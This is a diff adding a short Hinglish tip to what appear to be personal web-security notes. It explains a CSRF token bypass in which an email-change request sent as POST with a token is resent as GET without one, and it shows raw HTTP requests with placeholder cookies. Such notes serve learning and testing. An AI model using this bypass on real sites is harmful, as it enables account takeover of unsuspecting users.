@@ -55,6 +55,33 @@ burpsuite se jo form create hota he usme button rehta he usko victim ko click ka
 
 </script>
 
+------------------------------------------------------------------------------------------ 
+tip2 
+
+CSRF bypass via a GET Method 
+
+change Email ka req tha post request niche body me data tha 
+
+POST /email/change-email/
+host:reacted.com
+cookie: session=njfnrjnfrng
+
+email=ajaymagar@51gmail&csrf=dfuhfrufgruifgurfgr[token]
+
+
+new req 
+																		CSRF TOken bypass hua sirf POST req me CSRF Lagata he get me nahi
+GET /email/change-email?email=magarajay538@gmail http1.1
+host: example.com
+cookie: session:4484f4r9fr9frjkbfk
+
+------------------------------------------------------------
+
+
+
+
+
+
 
 
 
